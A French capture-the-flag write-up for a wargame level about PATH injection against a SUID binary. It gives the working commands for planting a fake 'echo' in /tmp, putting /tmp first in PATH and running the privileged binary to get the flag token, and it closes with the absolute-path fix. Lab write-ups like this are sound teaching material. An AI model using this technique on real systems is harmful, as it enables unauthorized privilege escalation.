# Level03 — Path Injection sur binaire SUID

## Fichier fourni

```sh
ls -la ~/level03
# -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

- **SUID** : le binaire s'exécute avec l'UID de `flag03`
- **groupe `level03`** : on a le droit de l'exécuter

## Reconnaissance

```sh
strings ~/level03
```

Le binaire appelle une commande (`echo`) **sans chemin absolu**. Le système la cherche dans `$PATH` dans l'ordre — c'est le vecteur d'attaque.

## Exploitation — Path Injection

On crée un faux `echo` dans `/tmp` qui appelle `getflag`, puis on met `/tmp` en tête du `$PATH` :

```sh
echo "getflag" > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
~/level03
```

Le binaire cherche `echo` → trouve `/tmp/echo` en premier → exécute `getflag` avec l'UID de `flag03` → token retourné.

## Résultat

```sh
Check flag.Here is your token : <TOKEN>   # voir ../flag
```

## Vulnérabilité

Un binaire SUID qui appelle des commandes sans chemin absolu est vulnérable au **path injection** : n'importe quel utilisateur ayant accès à `/tmp` peut substituer la commande appelée. La correction : toujours utiliser des chemins absolus dans un binaire privilégié (`/bin/echo` au lieu de `echo`).
